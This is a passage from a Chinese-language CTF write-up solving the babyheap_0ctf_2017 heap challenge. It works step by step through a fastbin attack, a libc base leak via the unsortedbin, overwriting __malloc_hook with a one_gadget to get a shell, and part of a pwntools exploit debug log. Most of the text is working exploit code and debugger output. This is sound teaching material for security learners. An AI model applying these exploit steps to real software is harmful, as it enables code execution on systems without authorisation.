#这么做是因为当申请index4这块内存的时候,他会检查大小是不是fastbin的范围内（请注意这点)
payload = p64(0)*3
payload += p64(0x21)
fill(3, payload)
```

```c
0x555555757000:	0x0000000000000000	0x0000000000000021 #index0
0x555555757010:	0x0000000000000000	0x0000000000000000
0x555555757020:	0x0000000000000000	0x0000000000000021 #index1
0x555555757030:	0x0000000000000000	0x0000000000000000
0x555555757040:	0x0000000000000000	0x0000000000000021 #index2（fastbin）
0x555555757050:	0x0000555555757080	0x0000000000000000
0x555555757060:	0x0000000000000000	0x0000000000000021 #index3
0x555555757070:	0x0000000000000000	0x0000000000000000
0x555555757080:	0x0000000000000000	0x0000000000000021 #index4（fastbin）
--------------------------------------------------------------    
执行payload前原来的内容为：
0x555555757080:	0x0000000000000000	0x0000000000000091 #index4（fastbin）
-------------------------------------------------------------- 
.....（省略内容均为空）
0x555555757110:	0x0000000000000000	0x0000000000020ef1 #top_chunk
.....（省略内容均为空）
0x555555757180:	0x0000000000000000	0x0000000000000000
pwndbg> 
```

**<font style="color:#F5222D;">再次强调，在申请fastbin中内存时，会检查被释放堆块的size（大小）是否在fastbin的范围内，如果不在，程序则异常退出，这有关于fastbin的机制。</font>**

> 结构体状况未发生改变。
>

### <font style="color:#000000;">1-6、申请index4</font>
```c
#改好index4的大小之后去申请两次，这样就把原来的fastbin中的给申请出来了
alloc(0x10)
alloc(0x10)
#申请成功之后index2就指向index4
```

首先是两个malloc，前面fastbin里一开始是两个chunk，分别为index2->index1，后来我们修改index2->fd为index4的地址，fastbin里变为index2->index4。第一个malloc会先分配index2给我们（fastbin分配原则是LIFO即后进先出），第二个malloc会将index4分配给我们。

看一下堆：

```c
pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x555555757000
Size: 0x21

Allocated chunk | PREV_INUSE
Addr: 0x555555757020
Size: 0x21

Allocated chunk | PREV_INUSE
Addr: 0x555555757040
Size: 0x21

Allocated chunk | PREV_INUSE
Addr: 0x555555757060
Size: 0x21

Allocated chunk
Addr: 0x555555757080
Size: 0x00

pwndbg> 
```

此时的内存：

```c
pwndbg> x/50gx 0x555555757000
0x555555757000:	0x0000000000000000	0x0000000000000021 #index0
0x555555757010:	0x0000000000000000	0x0000000000000000
0x555555757020:	0x0000000000000000	0x0000000000000021 #index1
0x555555757030:	0x0000000000000000	0x0000000000000000
0x555555757040:	0x0000000000000000	0x0000000000000021 #index2
0x555555757050:	0x0000000000000000	0x0000000000000000
0x555555757060:	0x0000000000000000	0x0000000000000021 #index3
0x555555757070:	0x0000000000000000	0x0000000000000000
0x555555757080:	0x0000000000000000	0x0000000000000021 #index4
0x555555757090:	0x0000000000000000	0x0000000000000000
.....（省略内容均为空）
0x555555757110:	0x0000000000000000	0x0000000000020ef1 #top_chunk
0x555555757120:	0x0000000000000000	0x0000000000000000
.....（省略内容均为空）
0x555555757180:	0x0000000000000000	0x0000000000000000
pwndbg> 
```

此时的结构体状况：

```c
0x5fcead98730:	0x0000000000000001	0x0000000000000010
    			#index0
0x5fcead98740:	0x0000555555757010	0x0000000000000001
    								#index1（chunk_flag改变）
0x5fcead98750:	0x0000000000000010	0x0000555555757050
                #chunk_content_size（改变）   #chunk_data_ptr（改变）     
0x5fcead98760:	0x0000000000000001	0x0000000000000010
     			#index2（chunk_flag改变）  #chunk_data_size（改变）     
0x5fcead98770:	0x0000555555757090	0x0000000000000001
    			#chunk_data_ptr（改变）  #index3
0x5fcead98780:	0x0000000000000010	0x0000555555757070
0x5fcead98790:	0x0000000000000001	0x0000000000000080
    			#index4
0x5fcead987a0:	0x0000555555757090	0x0000000000000000
0x5fcead987b0:	0x0000000000000000	0x0000000000000000
```

**<font style="color:#13C2C2;">注意，此时我们有两个地方指向index4：</font>**

+ **<font style="color:#13C2C2;">index4的content指针（程序的正常指向）</font>**
+ **<font style="color:#13C2C2;">index2的content指针 （通过执行payload中malloc之后的指向，参照上方代码框中的结构体）</font>**

**<font style="color:#13C2C2;">第二个malloc得到的是index为2的chunk，这与程序中的Allocate函数有关，可以回顾一下前面的IDA代码。</font>**

**<font style="color:#F5222D;">也就是说假如我们现在要fill index2的内容，那么其实上是修改index4的内容。</font>**

### 1-7、修改index4的size为0x91
```c
#为了让index4能够被放到unsortedbin中,要把它的大小改回来
payload = p64(0)*3
payload += p64(0x91)
fill(3, payload)
```

```c
pwndbg> x/50gx 0x555555757000
0x555555757000:	0x0000000000000000	0x0000000000000021 #index0
0x555555757010:	0x0000000000000000	0x0000000000000000
0x555555757020:	0x0000000000000000	0x0000000000000021 #index1
0x555555757030:	0x0000000000000000	0x0000000000000000
0x555555757040:	0x0000000000000000	0x0000000000000021 #index2
0x555555757050:	0x0000000000000000	0x0000000000000000
0x555555757060:	0x0000000000000000	0x0000000000000021 #index3
0x555555757070:	0x0000000000000000	0x0000000000000000
0x555555757080:	0x0000000000000000	0x0000000000000091 #index4
0x555555757090:	0x0000000000000000	0x0000000000000000
.....（省略内容均为空）
0x555555757110:	0x0000000000000000	0x0000000000020ef1 #top_chunk
0x555555757120:	0x0000000000000000	0x0000000000000000
.....（省略内容均为空）
0x555555757180:	0x0000000000000000	0x0000000000000000
pwndbg> 
```

> 程序结构体未发生变化
>

### 1-8、申请新堆块--index5
```c
#再申请一个堆块（index5）防止index4与top chunk合并了，具体原因见前面
alloc(0x80)
```

```c
pwndbg> x/50gx 0x555555757000
0x555555757000:	0x0000000000000000	0x0000000000000021 #index0
0x555555757010:	0x0000000000000000	0x0000000000000000
0x555555757020:	0x0000000000000000	0x0000000000000021 #index1
0x555555757030:	0x0000000000000000	0x0000000000000000
0x555555757040:	0x0000000000000000	0x0000000000000021 #index2
0x555555757050:	0x0000000000000000	0x0000000000000000
0x555555757060:	0x0000000000000000	0x0000000000000021 #index3
0x555555757070:	0x0000000000000000	0x0000000000000000
0x555555757080:	0x0000000000000000	0x0000000000000091 #index4
0x555555757090:	0x0000000000000000	0x0000000000000000
.....（省略内容均为空）
0x555555757110:	0x0000000000000000	0x0000000000000091 #index5
.....（省略内容均为空）
0x5555557571a0:	0x0000000000000000	0x0000000000020e61 #top_chunk
.....（省略内容均为空）
pwndbg> 
```

此时程序结构体如下：

```c
0x5fcead98730:	0x0000000000000001	0x0000000000000010
    			#index0
0x5fcead98740:	0x0000555555757010	0x0000000000000001
    								#index1
0x5fcead98750:	0x0000000000000010	0x0000555555757050    
0x5fcead98760:	0x0000000000000001	0x0000000000000010
     			#index2     
0x5fcead98770:	0x0000555555757090	0x0000000000000001
    							    #index3
0x5fcead98780:	0x0000000000000010	0x0000555555757070
0x5fcead98790:	0x0000000000000001	0x0000000000000080
    			#index4
0x5fcead987a0:	0x0000555555757090	0x0000000000000001
    								#index5（此处发生了改变）
0x5fcead987b0:	0x0000000000000080	0x0000555555757120
    			#（此处发生了改变）     #（此处发生了改变）
```

### 1-9、free(index4)，将index4放入unsortedbin中
```c
#这时候free就会把index4放到unsorted中了
free(4)
```

```c
pwndbg> bin
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all [corrupted]
FD: 0x555555757080 ◂— 0x0
BK: 0x555555757080 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x555555757080
smallbins
empty
largebins
empty
pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x555555757000
Size: 0x21

Allocated chunk | PREV_INUSE
Addr: 0x555555757020
Size: 0x21

Allocated chunk | PREV_INUSE
Addr: 0x555555757040
Size: 0x21

Allocated chunk | PREV_INUSE
Addr: 0x555555757060
Size: 0x21

Free chunk (unsortedbin) | PREV_INUSE
Addr: 0x555555757080
Size: 0x91
fd: 0x00
bk: 0x7ffff7dd1b78

Allocated chunk
Addr: 0x555555757110
Size: 0x90

Top chunk | PREV_INUSE
Addr: 0x5555557571a0
Size: 0x20e61

pwndbg> x/16gx &main_arena
0x7ffff7dd1b20 <main_arena>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b30 <main_arena+16>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b40 <main_arena+32>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b50 <main_arena+48>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b60 <main_arena+64>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b70 <main_arena+80>:	0x0000000000000000	0x00005555557571a0 #top_chunk
0x7ffff7dd1b80 <main_arena+96>:	0x0000000000000000	0x0000555555757080 #unsortedbin
0x7ffff7dd1b90 <main_arena+112>:	0x0000555555757080	0x00007ffff7dd1b88
pwndbg> x/60gx 0x555555757000
0x555555757000:	0x0000000000000000	0x0000000000000021 #index0
0x555555757010:	0x0000000000000000	0x0000000000000000
0x555555757020:	0x0000000000000000	0x0000000000000021 #index1
0x555555757030:	0x0000000000000000	0x0000000000000000
0x555555757040:	0x0000000000000000	0x0000000000000021 #index2
0x555555757050:	0x0000000000000000	0x0000000000000000
0x555555757060:	0x0000000000000000	0x0000000000000021 #index3
0x555555757070:	0x0000000000000000	0x0000000000000000
0x555555757080:	0x0000000000000000	0x0000000000000091 #index4（unsortedbin）
0x555555757090:	0x00007ffff7dd1b78	0x00007ffff7dd1b78
.....（省略内容均为空）
0x555555757110:	0x0000000000000000	0x0000000000000090 #index5
.....（省略内容均为空）
0x5555557571a0:	0x0000000000000000	0x0000000000020e61 #top_chunk
.....（省略内容均为空）
0x5555557571d0:	0x0000000000000000	0x0000000000000000
pwndbg>
```

当unsortedbin里只有一个空闲的chunk时，该chunk的fd和bk指针均指向unsortedbin本身，这个可以参考CTF-wiki中的内容，这里先不细说。

```c
0x5fcead98730:	0x0000000000000001	0x0000000000000010
    			#index0
0x5fcead98740:	0x0000555555757010	0x0000000000000001
    								#index1
0x5fcead98750:	0x0000000000000010	0x0000555555757050    
0x5fcead98760:	0x0000000000000001	0x0000000000000010
     			#index2     
0x5fcead98770:	0x0000555555757090	0x0000000000000001
    							    #index3
0x5fcead98780:	0x0000000000000010	0x0000555555757070
0x5fcead98790:	0x0000000000000000	0x0000000000000000
    			#index4（此处发生了改变）#（此处发生了改变）     
0x5fcead987a0:	0x0000000000000000	0x0000000000000001
    			#（此处发生了改变）	   #index5
0x5fcead987b0:	0x0000000000000080	0x0000555555757120
```

### 1-10、计算libc基址
这时查看我们的内存分布：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1604659813767-e4f0e97b-0f5e-4c25-afbb-cfe0581d42cd.png)

> 注意：文章前面的结构体内存情况是我后来补充的，由于地址随机，故与上图的地址不相同。
>

---

> 0x7ffff7a0d000     0x7ffff7bcd000 r-xp   1c0000 0      /lib/x86_64-linux-gnu/libc-2.23.so
>

上面这一行中的0x7ffff7a0d000就是libc的基地址。

**<font style="color:#F5222D;">libc基址与unsortedbin本身的地址的offset是不变的</font>**。为：![](https://cdn.nlark.com/yuque/0/2020/png/574026/1604668034156-df0186c8-f2d3-4896-bc54-0072b8a78fb1.png)

3951480（十进制）==0x3C4B78

除了上面payload外，还可以直接这样写：

```c
-----------------------------------------------------------------------------
还可以直接这样写
libc_base = u64(dump(2)[:8].strip().ljust(8, "\x00"))-0x3c4b78
-----------------------------------------------------------------------------
示例payload的写法：
#因为index2是指向index4的，所以直接把index2给dump一下就能拿到index4中前一部分的内容了
#main_arena与libc偏移为0x3c4b20(附件中有工具)
#再加上main_arena与unsortedbin的偏移,得到unsortedbins与libc的偏移
unsorted_offset_mainarena=unsorted_offset_arena(5)#这函数还不太明白
unsorted_addr=u64(dump(2)[:8].strip().ljust(8, "\x00"))
libc_base=unsorted_addr-0x3c4b20-unsorted_offset_mainarena
log.info("libc_base: "+hex(libc_base))
    
def unsorted_offset_arena(idx):
    word_bytes = context.word_size / 8
    offset = 4  # lock
    offset += 4  # flags
    offset += word_bytes * 10  # offset fastbin
    offset += word_bytes * 2  # top,last_remainder
    offset += idx * 2 * word_bytes  # idx
    offset -= word_bytes * 2  # bin overlap
    return offset
-----------------------------------------------------------------------------
```

> 结构体状况未发生改变
>

## 2、控制__malloc_hook
### 2-1、申请unsortedbin中的堆块
```c
alloc(0x60)
```

由于在申请空间之前，之后unsortedbin中有空闲的空间，因此申请空间之后会使用unsortedbin中的chunk。

看一下此时的堆内存：

```c
pwndbg> x/60gx 0x555555757000
0x555555757000:	0x0000000000000000	0x0000000000000021 #index0
0x555555757010:	0x0000000000000000	0x0000000000000000
0x555555757020:	0x0000000000000000	0x0000000000000021 #index1
0x555555757030:	0x0000000000000000	0x0000000000000000
0x555555757040:	0x0000000000000000	0x0000000000000021 #index2
0x555555757050:	0x0000000000000000	0x0000000000000000
0x555555757060:	0x0000000000000000	0x0000000000000021 #index3
0x555555757070:	0x0000000000000000	0x0000000000000000
0x555555757080:	0x0000000000000000	0x0000000000000071 #index4(由unsortedbin分裂)
.....（省略内容均为空）
0x5555557570f0:	0x0000000000000000	0x0000000000000021 #index5(由unsortedbin分裂)
0x555555757100:	0x00007ffff7dd1b78	0x00007ffff7dd1b78
0x555555757110:	0x0000000000000020	0x0000000000000090 #index6（原index5）
.....（省略内容均为空）
0x5555557571a0:	0x0000000000000000	0x0000000000020e61 #top_chunk
.....（省略内容均为空）
0x5555557571d0:	0x0000000000000000	0x0000000000000000
pwndbg> 
```

从上面的堆情况可以看到，由于是malloc(0x60)，而原unsortedbin中的chunk_size过大，因此unsortedbin中的chunk会利用并分裂成两个堆块，其中index5还是存放在unsortedbin中的：

```c
pwndbg> bin
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all [corrupted]
FD: 0x5555557570f0 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x5555557570f0
BK: 0x5555557570f0 ◂— 0x90
----------------------------------------------------------------------
执行payload前：
unsortedbin
all [corrupted]
FD: 0x555555757080 ◂— 0x0
BK: 0x555555757080 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x555555757080
----------------------------------------------------------------------
smallbins
empty
largebins
empty
pwndbg> 
```

此时结构体的情况：

```c
0x5fcead98730:	0x0000000000000001	0x0000000000000010
    			#index0
0x5fcead98740:	0x0000555555757010	0x0000000000000001
    								#index1
0x5fcead98750:	0x0000000000000010	0x0000555555757050    
0x5fcead98760:	0x0000000000000001	0x0000000000000010
     			#index2     
0x5fcead98770:	0x0000555555757090	0x0000000000000001
    							    #index3
0x5fcead98780:	0x0000000000000010	0x0000555555757070
0x5fcead98790:	0x0000000000000001	0x0000000000000060
    			#index4（此处发生了改变）#（此处发生了改变）     
0x5fcead987a0:	0x0000555555757090	0x0000000000000001
    			#（此处发生了改变）	   #index6（原index5）
0x5fcead987b0:	0x0000000000000080	0x0000555555757120
```

### 2-2、free(index4)
```c
#index2_content指针还是指向index4_chunk_data
#为了修改之后index4的fd指针，因此我们可以先释放index4
free(4)
```

```c
pwndbg> bin
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x555555757080 ◂— 0x0
0x80: 0x0
unsortedbin （这里显示不准确）
all: 0x0
smallbins
empty
largebins
empty
pwndbg>
```

```c
pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x555555757000
Size: 0x21

Allocated chunk | PREV_INUSE
Addr: 0x555555757020
Size: 0x21

Allocated chunk | PREV_INUSE
Addr: 0x555555757040
Size: 0x21

Allocated chunk | PREV_INUSE
Addr: 0x555555757060
Size: 0x71

Allocated chunk | PREV_INUSE
Addr: 0x5555557570d0
Size: 0x21

Allocated chunk
Addr: 0x5555557570f0
Size: 0x90

Allocated chunk | PREV_INUSE
Addr: 0x555555757180
Size: 0x20e61
pwndbg> x/60gx 0x555555757000
0x555555757000:	0x0000000000000000	0x0000000000000021 #index0
0x555555757010:	0x0000000000000000	0x0000000000000000
0x555555757020:	0x0000000000000000	0x0000000000000021 #index1
0x555555757030:	0x0000000000000000	0x0000000000000000
0x555555757040:	0x0000000000000000	0x0000000000000021 #index2
0x555555757050:	0x0000000000000000	0x0000000000000000
0x555555757060:	0x0000000000000000	0x0000000000000021 #index3
0x555555757070:	0x0000000000000000	0x0000000000000000
0x555555757080:	0x0000000000000000	0x0000000000000071 #index4（fastbin）
.....（省略内容均为空）
0x5555557570f0:	0x0000000000000000	0x0000000000000021 #index5（unsortedbin）
0x555555757100:	0x00007ffff7dd1b78	0x00007ffff7dd1b78
0x555555757110:	0x0000000000000020	0x0000000000000090 #index6
.....（省略内容均为空）
0x5555557571a0:	0x0000000000000000	0x0000000000020e61 #top_chunk
.....（省略内容均为空）
0x5555557571d0:	0x0000000000000000	0x0000000000000000
pwndbg> 
```

```c
0x5fcead98730:  0x0000000000000001  0x0000000000000010
                #index0
0x5fcead98740:  0x0000555555757010  0x0000000000000001
                                    #index1
0x5fcead98750:  0x0000000000000010  0x0000555555757050    
0x5fcead98760:  0x0000000000000001  0x0000000000000010
                #index2     
0x5fcead98770:  0x0000555555757090  0x0000000000000001
                                    #index3
0x5fcead98780:  0x0000000000000010  0x0000555555757070
0x5fcead98790:  0x0000000000000000  0x0000000000000000
                #index4（此处发生了改变）#（此处发生了改变）     
0x5fcead987a0:  0x0000000000000000  0x0000000000000001
                #（此处发生了改变）     #index6（原index5）
0x5fcead987b0:  0x0000000000000080  0x0000555555757120
```

### 2-3、修改index4的fd指针
```c
#然后修改fd指针,通过index2往index4上写为malloc_hook,这样再次申请的时候会分配到这个地址
#但问题是我们去申请的时候会检查size是不是 fakefd + 8 == 当前fastbin的大小
#这个地址是main_arena-0x40+0xd,具体看后面图片解释
payload = p64(libc_base+0x3c4aed)
fill(2, payload)
```

```c
pwndbg> x/60gx 0x555555757000
0x555555757000:	0x0000000000000000	0x0000000000000021 #index0
0x555555757010:	0x0000000000000000	0x0000000000000000
0x555555757020:	0x0000000000000000	0x0000000000000021 #index1
0x555555757030:	0x0000000000000000	0x0000000000000000
0x555555757040:	0x0000000000000000	0x0000000000000021 #index2
0x555555757050:	0x0000000000000000	0x0000000000000000
0x555555757060:	0x0000000000000000	0x0000000000000021 #index3
0x555555757070:	0x0000000000000000	0x0000000000000000
0x555555757080:	0x0000000000000000	0x0000000000000071 #index4（fastbin）
0x555555757090:	0x00007ffff7dd1aed	0x0000000000000000
    			#更改index4的fd指针
.....（省略内容均为空）
0x5555557570f0:	0x0000000000000000	0x0000000000000021 #index5（unsortedbin）
0x555555757100:	0x00007ffff7dd1b78	0x00007ffff7dd1b78
0x555555757110:	0x0000000000000020	0x0000000000000090 #index6
.....（省略内容均为空）
0x5555557571a0:	0x0000000000000000	0x0000000000020e61 #top_chunk
.....（省略内容均为空）
0x5555557571d0:	0x0000000000000000	0x0000000000000000
pwndbg> 
```

```c
pwndbg> x/16gx 0x00007ffff7dd1aed
0x7ffff7dd1aed <_IO_wide_data_0+301>:	0xfff7dd0260000000	0x000000000000007f
0x7ffff7dd1afd:	0xfff7a92ea0000000	0xfff7a92a7000007f
0x7ffff7dd1b0d <__realloc_hook+5>:	0x000000000000007f	0x0000000000000000
0x7ffff7dd1b1d:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b2d <main_arena+13>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b3d <main_arena+29>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b4d <main_arena+45>:	0x5555757080000000	0x0000000000000055
0x7ffff7dd1b5d <main_arena+61>:	0x0000000000000000	0x0000000000000000
pwndbg> 
```

> 此时程序的结构体未发生改变
>

### 2-4、控制__malloc_hook
```c
#这时候再去申请两个,第一个是给前面free的index4,第二个就会分配到malloc_hook处
alloc(0x60)#index4
alloc(0x60)#index7
```

```c
pwndbg> x/16gx 0x00007ffff7dd1aed
0x7ffff7dd1aed <_IO_wide_data_0+301>:	0xfff7dd0260000000	0x000000000000007f
0x7ffff7dd1afd:	0xfff7a92ea0000000	0xfff7a92a7000007f
0x7ffff7dd1b0d <__realloc_hook+5>:	0x000000000000007f	0x0000000000000000
0x7ffff7dd1b1d:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b2d <main_arena+13>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b3d <main_arena+29>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b4d <main_arena+45>:	0x2ea0000000000000	0x0000000000fff7a9
0x7ffff7dd1b5d <main_arena+61>:	0x0000000000000000	0x0000000000000000
pwndbg> 
```

```c
0x5fcead98730:  0x0000000000000001  0x0000000000000010
                #index0
0x5fcead98740:  0x0000555555757010  0x0000000000000001
                                    #index1
0x5fcead98750:  0x0000000000000010  0x0000555555757050    
0x5fcead98760:  0x0000000000000001  0x0000000000000010
                #index2     
0x5fcead98770:  0x0000555555757090  0x0000000000000001
                                    #index3
0x5fcead98780:  0x0000000000000010  0x0000555555757070
0x5fcead98790:  0x0000000000000001  0x0000000000000060
                #index4（此处发生了改变）#（此处发生了改变）     
0x5fcead987a0:  0x0000555555757090  0x0000000000000001
                #（此处发生了改变）     #index6（原index5）
0x5fcead987b0:  0x0000000000000080  0x0000555555757120
0x5fcead987c0:	0x0000000000000001	0x0000000000000060
    			#index7
0x5fcead987d0:	0x00007ffff7dd1afd	0x0000000000000000
pwndbg> 
```

> **<font style="color:#000000;">这里用到了fastbin_attack中的Arbitrary Alloc，具体细节请参考上一节。</font>**
>

### 2-5、写入one_gadget并getshell
```c
#然后往malloc_hook上写one_gadget的地址
payload = p8(0)*3
payload += p64(0)*2
payload += p64(libc_base+0x4527a)
fill(6, payload)
gdb.attach(p)
```

```c
执行payload前：
pwndbg> x/16gx 0x00007ffff7dd1aed
0x7ffff7dd1aed <_IO_wide_data_0+301>:	0xfff7dd0260000000	0x000000000000007f
0x7ffff7dd1afd:	0xfff7a92ea0000000	0xfff7a92a7000007f
    			#chunk_data
0x7ffff7dd1b0d <__realloc_hook+5>:	0x000000000000007f	0x0000000000000000
0x7ffff7dd1b1d:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b2d <main_arena+13>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b3d <main_arena+29>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b4d <main_arena+45>:	0x2ea0000000000000	0x0000000000fff7a9
0x7ffff7dd1b5d <main_arena+61>:	0x0000000000000000	0x0000000000000000
pwndbg> 
-------------------------------------------------------------------------------
执行payload后：
pwndbg> x/16gx 0x00007ffff7dd1aed
0x7ffff7dd1aed <_IO_wide_data_0+301>:	0xfff7dd0260000000	0x000000000000007f
0x7ffff7dd1afd:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b0d <__realloc_hook+5>:	0xfff7a5227a000000	0x000000000000007f
    								#one_gadget
0x7ffff7dd1b1d:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b2d <main_arena+13>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b3d <main_arena+29>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b4d <main_arena+45>:	0x2ea0000000000000	0x0000000000fff7a9
0x7ffff7dd1b5d <main_arena+61>:	0x0000000000000000	0x0000000000000000
pwndbg> 
```

我本机上的one_gadget如下图所示，可能需要尝试并更换多个one_gadget才能getshell：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1604720295529-f9788e54-ee53-4744-bbcc-fbf87b37eb44.png)

```c
#再申请一下触发one_gadget
alloc(255)
p.interactive()
```

## exp_debug
```c
➜  Desktop python yichen_exp.py 
[+] Starting local process './babyheap_0ctf_2017_patch' argv=['./babyheap_0ctf_2017_patch'] : pid 15293
[DEBUG] PLT 0x9b0 free
[DEBUG] PLT 0x9b8 __errno_location
[DEBUG] PLT 0x9c0 puts
[DEBUG] PLT 0x9c8 write
[DEBUG] PLT 0x9d0 __stack_chk_fail
[DEBUG] PLT 0x9d8 mmap
[DEBUG] PLT 0x9e0 printf
[DEBUG] PLT 0x9e8 alarm
[DEBUG] PLT 0x9f0 close
[DEBUG] PLT 0x9f8 read
[DEBUG] PLT 0xa00 __libc_start_main
[DEBUG] PLT 0xa08 calloc
[DEBUG] PLT 0xa10 __gmon_start__
[DEBUG] PLT 0xa18 setvbuf
[DEBUG] PLT 0xa20 atol
[DEBUG] PLT 0xa28 open
[DEBUG] PLT 0xa30 exit
[DEBUG] PLT 0xa38 __cxa_finalize
[*] '/home/ubuntu/Desktop/babyheap_0ctf_2017_patch'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[DEBUG] Received 0x53 bytes:
    '===== Baby Heap in 2017 =====\n'
    '1. Allocate\n'
    '2. Fill\n'
    '3. Free\n'
    '4. Dump\n'
    '5. Exit\n'
    'Command: '
[DEBUG] Sent 0x2 bytes:
    '1\n'
[DEBUG] Received 0x6 bytes:
    'Size: '
[DEBUG] Sent 0x3 bytes:
    '16\n'
[DEBUG] Received 0x46 bytes:
    'Allocate Index 0\n'
    '1. Allocate\n'
    '2. Fill\n'
    '3. Free\n'
    '4. Dump\n'
    '5. Exit\n'
    'Command: '
[DEBUG] Sent 0x2 bytes:
    '1\n'
[DEBUG] Received 0x6 bytes:
    'Size: '
[DEBUG] Sent 0x3 bytes:
    '16\n'
[DEBUG] Received 0x46 bytes:
    'Allocate Index 1\n'
    '1. Allocate\n'
    '2. Fill\n'
    '3. Free\n'
    '4. Dump\n'
    '5. Exit\n'
    'Command: '
[DEBUG] Sent 0x2 bytes:
    '1\n'
[DEBUG] Received 0x6 bytes:
    'Size: '
[DEBUG] Sent 0x3 bytes:
    '16\n'
[DEBUG] Received 0x46 bytes:
    'Allocate Index 2\n'
    '1. Allocate\n'
    '2. Fill\n'
    '3. Free\n'
    '4. Dump\n'
    '5. Exit\n'
    'Command: '
[DEBUG] Sent 0x2 bytes:
    '1\n'
[DEBUG] Received 0x6 bytes:
    'Size: '
[DEBUG] Sent 0x3 bytes:
    '16\n'
[DEBUG] Received 0x46 bytes:
    'Allocate Index 3\n'
    '1. Allocate\n'
    '2. Fill\n'
    '3. Free\n'
    '4. Dump\n'
    '5. Exit\n'
    'Command: '
[DEBUG] Sent 0x2 bytes:
    '1\n'
[DEBUG] Received 0x6 bytes:
    'Size: '
[DEBUG] Sent 0x4 bytes:
    '128\n'
[DEBUG] Received 0x46 bytes:
    'Allocate Index 4\n'
    '1. Allocate\n'
    '2. Fill\n'
    '3. Free\n'
    '4. Dump\n'
    '5. Exit\n'
    'Command: '
[DEBUG] Sent 0x2 bytes:
    '3\n'
[DEBUG] Received 0x7 bytes:
    'Index: '
[DEBUG] Sent 0x2 bytes:
    '1\n'
[DEBUG] Received 0x35 bytes:
    '1. Allocate\n'
    '2. Fill\n'
    '3. Free\n'
    '4. Dump\n'
    '5. Exit\n'
    'Command: '
[DEBUG] Sent 0x2 bytes:
    '3\n'
[DEBUG] Received 0x7 bytes:
    'Index: '
[DEBUG] Sent 0x2 bytes:
    '2\n'
[DEBUG] Received 0x35 bytes:
    '1. Allocate\n'
    '2. Fill\n'
    '3. Free\n'
    '4. Dump\n'
    '5. Exit\n'
    'Command: '
[DEBUG] Sent 0x2 bytes:
    '2\n'
[DEBUG] Received 0x7 bytes:
    'Index: '
[DEBUG] Sent 0x2 bytes:
    '0\n'
[DEBUG] Received 0x6 bytes:
    'Size: '
[DEBUG] Sent 0x3 bytes:
    '65\n'
[DEBUG] Received 0x9 bytes:
    'Content: '
[DEBUG] Sent 0x41 bytes:
    00000000  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
    00000010  00 00 00 00  00 00 00 00  21 00 00 00  00 00 00 00  │····│····│!···│····│
    00000020  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
    00000030  00 00 00 00  00 00 00 00  21 00 00 00  00 00 00 00  │····│····│!···│····│
    00000040  80                                                  │·│
    00000041
[DEBUG] Received 0x35 bytes:
    '1. Allocate\n'
    '2. Fill\n'
    '3. Free\n'
    '4. Dump\n'
    '5. Exit\n'
    'Command: '
[DEBUG] Sent 0x2 bytes:
    '2\n'
[DEBUG] Received 0x7 bytes:
    'Index: '
[DEBUG] Sent 0x2 bytes:
    '3\n'
[DEBUG] Received 0x6 bytes:
    'Size: '
[DEBUG] Sent 0x3 bytes:
    '32\n'
[DEBUG] Received 0x9 bytes:
    'Content: '
[DEBUG] Sent 0x20 bytes:
    00000000  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
    00000010  00 00 00 00  00 00 00 00  21 00 00 00  00 00 00 00  │····│····│!···│····│
    00000020
[DEBUG] Received 0x35 bytes:
    '1. Allocate\n'
    '2. Fill\n'
    '3. Free\n'
    '4. Dump\n'
    '5. Exit\n'
    'Command: '
[DEBUG] Sent 0x2 bytes:
    '1\n'
[DEBUG] Received 0x6 bytes:
    'Size: '
[DEBUG] Sent 0x3 bytes:
    '16\n'
[DEBUG] Received 0x46 bytes:
    'Allocate Index 1\n'
    '1. Allocate\n'
    '2. Fill\n'
    '3. Free\n'
    '4. Dump\n'
    '5. Exit\n'
    'Command: '
[DEBUG] Sent 0x2 bytes:
    '1\n'
[DEBUG] Received 0x6 bytes:
    'Size: '
[DEBUG] Sent 0x3 bytes:
    '16\n'
[DEBUG] Received 0x46 bytes:
    'Allocate Index 2\n'
    '1. Allocate\n'
    '2. Fill\n'
    '3. Free\n'
    '4. Dump\n'
    '5. Exit\n'
    'Command: '
[DEBUG] Sent 0x2 bytes:
    '2\n'
[DEBUG] Received 0x7 bytes:
    'Index: '
[DEBUG] Sent 0x2 bytes:
    '3\n'
[DEBUG] Received 0x6 bytes:
    'Size: '
[DEBUG] Sent 0x3 bytes:
    '32\n'
[DEBUG] Received 0x9 bytes:
    'Content: '
